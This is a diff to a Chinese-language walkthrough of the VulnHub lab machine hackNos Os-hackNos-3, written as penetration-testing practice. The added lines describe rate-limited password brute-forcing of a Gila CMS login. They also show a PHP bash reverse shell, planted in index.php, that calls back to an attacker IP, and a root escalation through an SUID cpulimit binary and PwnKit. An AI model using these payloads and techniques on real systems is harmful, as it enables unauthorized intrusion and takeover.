@@ -1,6 +1,6 @@
-# HACKNOS: OS-HACKNOS-3
+# hackNos: Os-hackNos-3
 
-2025.02.x https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/
+2025.02.19 https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/
 
 ## Ip
 
@@ -16,4 +16,50 @@ PORT   STATE SERVICE
 
 扫描发现http://192.168.5.40/upload.php ffuf 探测一下参数，没找到。
 
-看到 80 首页底部提示：find the Bug You need extra WebSec , 访问 http://192.168.5.40/websec/ 目录得到新的页面，gobuster 再次扫描，发现了一个文件包含的 url http://192.168.5.40/websec/log/?url=about
+看到 80 首页底部提示：find the Bug You need extra WebSec , 访问 http://192.168.5.40/websec/ 目录得到新的页面，gobuster 再次扫描，发现登陆页面，title 显示 Gila CMS 看看有没有爆出的漏洞，发现 RCE https://www.exploit-db.com/exploits/51569 但是需要用户凭据。
+
+在首页底部发现了一个邮箱：contact@hacknos.com 需要找到密码，使用一个简单的密码字典进行爆破，得到了密码为 Securityx , 在扫描时需要调低扫描速度，系统会对登陆速率进行检测。
+
+然后再次执行 51569 exp ，但是执行后是 404，exp 有问题，手动执行，在系统后台左侧 Content -> File Manager -> 编辑 index.php 文件，添加如下内容：
+
+http://192.168.5.40/websec/admin/fm?f=./index.php
+
+```
+system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"');
+```
+
+然后访问： curl http://192.168.5.40/websec/ 在 kali 上获得了反弹 shell。
+
+先拿到了 user flag：
+
+```
+www-data@hacknos:/home/blackdevil$ cat user.txt
+bae11ce4f67af91fa58576c1da2aad4b
+```
+
+发现 suid 程序：
+
+```
+www-data@hacknos:/home/blackdevil$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
+Process 2989 detected
+# cd /root
+# cat root.txt
+########    #####     #####   ########         ########
+##     ##  ##   ##   ##   ##     ##            ##     ##
+##     ## ##     ## ##     ##    ##            ##     ##
+########  ##     ## ##     ##    ##            ########
+##   ##   ##     ## ##     ##    ##            ##   ##
+##    ##   ##   ##   ##   ##     ##            ##    ##
+##     ##   #####     #####      ##    ####### ##     ##
+
+
+MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+Author: Rahul Gehlaut
+
+Blog: www.hackNos.com
+
+Linkedin: https://in.linkedin.com/in/rahulgehlaut
+```
+
+同时也可以利用 CVE-2021-4034 PwnKit 直接提权到 root。
